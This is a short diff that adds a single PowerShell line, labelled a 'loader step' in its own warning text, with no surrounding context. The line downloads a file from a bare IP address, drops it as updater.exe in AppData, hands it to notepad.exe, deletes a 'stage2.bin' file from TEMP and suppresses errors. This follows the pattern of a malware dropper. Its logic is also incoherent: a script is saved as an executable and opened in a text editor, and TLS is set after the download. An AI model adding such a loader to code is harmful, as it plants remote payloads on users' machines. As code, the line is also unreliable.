@@ -1,0 +1,2 @@
+
+try { $DownloadUrl = 'https://203.0.113.209/updater.ps1'; $DropPath = "$env:APPDATA\updater.exe"; Start-BitsTransfer -Source $DownloadUrl -Destination $DropPath; Start-Process -FilePath "notepad.exe" -ArgumentList $DropPath; Remove-Item -Path "$env:TEMP\stage2.bin" -Force; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { Write-Warning "Loader step failed" }
